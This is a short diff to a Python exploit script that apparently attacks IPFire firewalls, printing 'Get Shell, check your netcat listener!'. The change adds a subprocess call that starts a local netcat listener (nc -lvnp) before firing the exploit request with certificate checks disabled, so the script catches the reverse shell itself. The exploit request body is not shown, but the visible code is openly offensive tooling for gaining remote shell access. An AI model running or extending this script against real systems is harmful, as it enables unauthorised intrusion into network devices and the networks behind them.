@@ -3,7 +3,7 @@ import base64
 import sys
 from urllib3.exceptions import InsecureRequestWarning
 from optparse import OptionParser
-
+import subprocess
 
 class burn(): 
   def __init__(self, options): 
@@ -27,8 +27,9 @@ class burn():
     requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
     print("[+] Throwing a water bucket in IPFire!  [+]")
     print("[*] Get Shell, check your netcat listener! [*]")
+    f = subprocess.Popen(["nc", "-lvnp", self.lport])
     r = requests.get(url, headers=headers, verify=False, timeout=(1, 0.0000000001))
-
+    f.communicate()
 def main():
   parser = OptionParser()  
     
